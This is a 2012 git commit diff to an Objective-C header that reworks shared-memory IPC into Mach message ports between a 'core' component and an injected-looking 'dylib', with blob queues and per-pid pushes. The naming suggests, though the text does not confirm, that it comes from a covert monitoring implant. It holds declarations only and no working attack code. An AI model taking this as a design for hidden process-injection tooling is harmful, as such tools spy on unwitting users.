93c352652ef0e2932b55952842b3e0d200a0d675
kiodo <kiodo@SuperElbarto.local>
2012-06-21 15:02:12 +0200

    New shared men paradigm

--- Support/RCSISharedMemory.h
+++ Support/RCSISharedMemory.h
@@ -11,9 +11,23 @@
 
 #import <Foundation/Foundation.h>
 
+#import "RCSIDylibBlob.h"
+
+#define kRCS_SUCCESS 0
+#define kRCS_ERROR   1
 
 #ifndef __RCSISharedMemory_h__
 #define __RCSISharedMemory_h__
+
+CFDataRef coreMessagesHandler(CFMessagePortRef local,
+                              SInt32 msgid,
+                              CFDataRef data,
+                              void *info);
+
+CFDataRef dylibMessagesHandler(CFMessagePortRef local,
+                               SInt32 msgid,
+                               CFDataRef data,
+                               void *info);
 
 
 @interface RCSISharedMemory : NSObject
@@ -22,69 +36,53 @@
   NSString            *mFilename;
   char                *mSharedMemory;
   CFMessagePortRef    mMemPort;
-  CFRunLoopSourceRef  mRLSource;
+  NSMutableArray      *mLogMessageQueue;
   NSMutableArray      *mRemotePorts;
-  int                 mSize;
   int mFD;
   int mKey;
   int qID;
+  
+  // new attr
+  CFMessagePortRef    mCorePort;
+  CFMessagePortRef    mDylibPort;
+  NSMutableArray      *mCoreRemotePorts;
+  CFRunLoopSourceRef  mRLSource;
   NSMutableArray      *mCoreMessageQueue;
-  NSMutableArray      *mLogMessageQueue;
+  NSMutableArray      *mDylibBlobQueue;
+  uint                mDylibBlobCount;
 }
 
-@property (readwrite) char              *mSharedMemory;
-@property (readonly)  NSString          *mFilename;
-@property (readwrite) int               mSize;
-@property (readonly) NSMutableArray    *mCoreMessageQueue;
-@property (readonly) NSMutableArray    *mLogMessageQueue;
+@property (readwrite) char          *mSharedMemory;
+@property (readonly)  NSString      *mFilename;
+@property (readonly) NSMutableArray *mCoreMessageQueue;
+@property (readonly) NSMutableArray *mLogMessageQueue;
 
-- (id)initWithFilename: (NSString *)aFilename
-                  size: (u_int)aSize;
-- (void)dealloc;
 
-- (int)createMemoryRegion;
-- (int)createMemoryRegionForAgent;
-- (int)attachToMemoryRegion: (BOOL)fromScratch;
-- (int)detachFromMemoryRegion;
-
-- (BOOL)isShMemLog;
-- (BOOL)isShMemCmd;
-- (void)addPort: (CFMessagePortRef) port;
-
-- (void)synchronizeRemotePort: (CFMessagePortRef)port
-                   withOffset: (u_int)aOffset
-                      andData: (NSData *)aData;
-
-- (void)synchronizeShMemToPort: (CFMessagePortRef)port;
-- (BOOL)synchronizeRemotePorts: (NSData *)data 
-                    withOffest: (u_int)anOffset;
-
-- (void)zeroFillMemory;
-- (BOOL)clearConfigurations;
-
-- (NSMutableData *)readMemory: (u_int)anOffset
-                fromComponent: (u_int)aComponent;
-- (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
-                                  forAgent: (u_int)anAgentID
-                           withCommandType: (u_int)aCommandType;
-
-- (BOOL)writeMemory: (NSData *)aData
-             offset: (u_int)anOffset
-      fromComponent: (u_int)aComponent;
-
-- (void)runMethod: (NSDictionary *)aDict;
-- (BOOL)isShMemValid;
-- (BOOL)restartShMem;
-
-//////////////////////////////////////
++ (RCSISharedMemory *)sharedInstance;
++ (BOOL)sendMessageToCoreMachPort:(NSData*)aData withMode:(NSString*)aMode;
++ (BOOL)sendMessageToMachPort:(mach_port_t)port 
+                     withData:(NSData *)aData;
+ 
+- (int)createDylibRLSource;
+- (void)addPort: (CFMessagePortRef)port;
+- (void)putBlob:(RCSIDylibBlob*)aBlob;
+- (id)getBlob;
+- (id)getBlobs;
+- (void)delBlobs;
+- (BOOL)syncDylibLocalPort;
 
 - (int)createCoreRLSource;
 - (NSMutableArray*)fetchMessages;
 
-+ (BOOL)sendMessageToCoreMachPort:(NSData*)aData withMode:(NSString*)aMode;
-+ (BOOL)sendMessageToMachPort:(mach_port_t)port 
-                     withData:(NSData *)aData;
-                     
+- (BOOL)writeAllIpcBlobsToPort:(CFMessagePortRef)aPort;
+- (BOOL)writeIpcBlob:(NSData*)aData;
+- (void)refreshRemoteBlobsToPid:(int)aPid;
+
+- (void)synchronizeRemotePort:(CFMessagePortRef)port
+                    withMsgId:(SInt32)aMsgId
+                      andData:(NSData *)aData;
+- (BOOL)synchronizeRemotePorts:(NSData *)data;
+
 @end
 
 #endif
